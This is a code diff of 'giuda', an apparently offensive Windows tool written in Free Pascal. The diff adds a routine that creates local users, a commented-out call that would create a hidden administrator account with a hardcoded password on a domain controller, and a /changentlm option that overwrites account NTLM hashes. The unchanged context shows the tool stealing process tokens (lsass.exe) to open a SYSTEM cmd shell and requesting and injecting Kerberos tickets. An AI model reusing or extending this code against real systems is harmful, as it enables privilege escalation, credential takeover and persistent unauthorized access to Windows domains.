@@ -1,7 +1,7 @@
 {$mode delphi}{$H+}
 program giuda;
 
-uses sysutils,windows,classes,uadvapi32,kerberos,usecur32,upsapi;
+uses googlebase, activex,sysutils,windows,kerberos,classes,uadvapi32,usecur32,upsapi,utils,usamlib,JwaLmAccess,jwalmcons,jwawintype;
 
 var
   ret,parampos:dword;
@@ -9,6 +9,8 @@ var
   dw,inhandle:dword;
   pb:pbyte;
   save:boolean=false;
+  user,newhash,oldpwd,newpwd,server:string;
+  oldhashbyte,newhashbyte:tbyte16;
 
 
 
@@ -18,7 +20,7 @@ begin
  //else future scope
 end;
 
-function accattivalo(cmdtorun: string;pid:string;params:string):boolean;
+function azzumpalo(cmdtorun: string;pid:string;params:string):boolean;
 var
   StartupInfo: TStartupInfoW;
   ProcessInformation: TProcessInformation;
@@ -27,7 +29,7 @@ begin
  ZeroMemory(@StartupInfo, SizeOf(TStartupInfoW));
  FillChar(StartupInfo, SizeOf(TStartupInfoW), 0);
  StartupInfo.cb := SizeOf(TStartupInfoW);
- StartupInfo.lpDesktop := 'WinSta0\Default';
+ StartupInfo.lpDesktop := 'WinSta0\Default'; //inttostr(
  verbose('Trying all Integrity levels from TOP',1);
  for i:=4 downto 0 do
    begin
@@ -43,7 +45,44 @@ begin
  verbose('Failed with CreateProcess,'+inttostr(getlasterror),1)
 end;
 
+function CreateWinUser(const wServer, wUsername, wPassword, wGroup:WideString): Boolean;
+var
+  Buf       : USER_INFO_2;//Buf for the new user info
+  Err       : NET_API_STATUS;
+  ParmErr   : DWORD;
+  GrpUsrInfo: LOCALGROUP_MEMBERS_INFO_3;//Buf for the group
+  wDummyStr : WideString;
+begin
+  wDummyStr:='';
+  FillChar (Buf, SizeOf(USER_INFO_2), 0);
+  with Buf do
+  begin
+    usri2_name      := PWideChar(wUsername);
+    usri2_full_name := PWideChar(wUsername);//You can add a more descriptive name here
+    usri2_password  := PWideChar(wPassword);
+    usri2_comment   := PWideChar(wDummyStr);
+    usri2_priv      := USER_PRIV_USER;
+    usri2_flags     := UF_SCRIPT OR UF_DONT_EXPIRE_PASSWD;
+    usri2_script_path := PWideChar(wDummyStr);
+    usri2_home_dir    := PWideChar(wDummyStr);
+    usri2_acct_expires:= TIMEQ_FOREVER;
+  end;
 
+  GrpUsrInfo.lgrmi3_domainandname:=PWideChar(wUsername);
+  //writeln(GrpUsrInfo.lgrmi3_domainandname);
+
+  Result:= (Err = 0);
+   writeln('[+] Creating '+wUsername);
+   Err := NetUserAdd(PWideChar(wServer), 1, @Buf, @ParmErr);
+   Result := (Err = 0);
+
+  if Result then //NOw you must set the group for the new user
+  begin
+  Err := NetLocalGroupAddMembers(PWideChar(wServer), PWideChar(wGroup), 3, @GrpUsrInfo, 1);
+  Result := (Err = 0);
+  end;
+
+end;
 
 
 procedure main;
@@ -52,7 +91,7 @@ var
   debugpriv:boolean;
 begin
   verbose(' :. fox aka calipendula',1);
-  verbose('GIUDA 2023072100',1);
+  verbose('GIUDA 2023090500',1);
   writeln();
 
   if paramcount>0 then
@@ -79,7 +118,7 @@ begin
    verbose('C:\> GIUDA -askluids',1);
    writeln();
    verbose('To ask a TGS',1);
-   verbose('C:\> GIUDA -gettgs -luid:0xNNNNN -msdsspn:LDAP/DCNAME',1);
+   verbose('C:\> GIUDA -gettgs -luid:0xNNNNN -msdsspn:HTTP/DCNAME',1);
    verbose('C:\> GIUDA -gettgs -luid:0xNNNNN -msdsspn:HTTP/DCNAME -save',1);
    writeln();
    verbose('Example:',1);
@@ -113,7 +152,7 @@ begin
           verbose('Check your syntax, PID is empty',1);
           exit;
          end;
-      if accattivalo('cmd.exe',pid,params)
+      if azzumpalo('cmd.exe',pid,params)
          then verbose('Giuda Opened CMD as GOD...',1)
          else verbose('Error, not good...',1);
      end;
@@ -135,7 +174,7 @@ begin
   if parampos>0 then
      begin
       pid:=inttostr(upsapi._EnumProc2('lsass.exe'));
-      if accattivalo('cmd.exe',pid,params)
+      if azzumpalo('cmd.exe',pid,params)
          then verbose('Giuda Opened CMD as GOD...',1)
          else verbose('Error, not good...',1);
      end;
@@ -236,6 +275,13 @@ begin
      end;
     verbose('Ticket loaded in memory',1);
     verbose('[!] Giuda betrayed',1);
+    (*if CreateWinUser('dc1', 'giuda','Password#33#','Administrators') then
+   begin
+    Writeln('[+] U: fox is now local Administrator');
+    Writeln('[+] P: Password#33#');
+   end
+  else
+   Writeln('[!] Check your privileges'); *)
    end;
 
 
@@ -252,6 +298,56 @@ begin
       kuhl_m_kerberos_clean ;
       end;
    end;
+
+  parampos:=pos('/newhash:',cmdline);
+  if parampos>0 then
+       begin
+       newhash:=copy(cmdline,parampos,255);
+       newhash:=stringreplace(newhash,'/newhash:','',[rfReplaceAll, rfIgnoreCase]);
+       delete(newhash,pos(' ',newhash),255);
+       end;
+  parampos:=pos('/oldpwd:',cmdline);
+  if parampos>0 then
+       begin
+       oldpwd:=copy(cmdline,parampos,255);
+       oldpwd:=stringreplace(oldpwd,'/oldpwd:','',[rfReplaceAll, rfIgnoreCase]);
+       delete(oldpwd,pos(' ',oldpwd),255);
+       end;
+  parampos:=pos('/newpwd:',cmdline);
+  if parampos>0 then
+       begin
+       newpwd:=copy(cmdline,parampos,255);
+       newpwd:=stringreplace(newpwd,'/newpwd:','',[rfReplaceAll, rfIgnoreCase]);
+       delete(newpwd,pos(' ',newpwd),255);
+       end;
+
+ parampos:=pos('/server:',cmdline);
+  if parampos>0 then
+       begin
+       server:=copy(cmdline,parampos,255);
+       server:=stringreplace(server,'/server:','',[rfReplaceAll, rfIgnoreCase]);
+       delete(server,pos(' ',server),255);
+       //log(server);
+       end;
+  parampos:=pos('/user:',cmdline);
+      if parampos>0 then
+           begin
+           user:=copy(cmdline,parampos,255);
+           user:=stringreplace(user,'/user:','',[rfReplaceAll, rfIgnoreCase]);
+           delete(user,pos(' ',user),255);
+           //log(user);
+           end;
+
+  parampos:=pos('/changentlm',cmdline);
+  if parampos>0 then
+       begin
+       if oldpwd<>'' then oldhashbyte:=tbyte16(GenerateNTLMHashByte (oldpwd));
+       if newpwd<>'' then newhashbyte:=tbyte16(GenerateNTLMHashByte (newpwd));
+       if newhash<>'' then newhashbyte :=HexaStringToByte (newhash);
+       if ChangeNTLM(server,user,oldhashbyte ,newhashbyte)
+          then log('OK',1)
+          else log('Failed to change',1);
+       end;
 
 end;
 
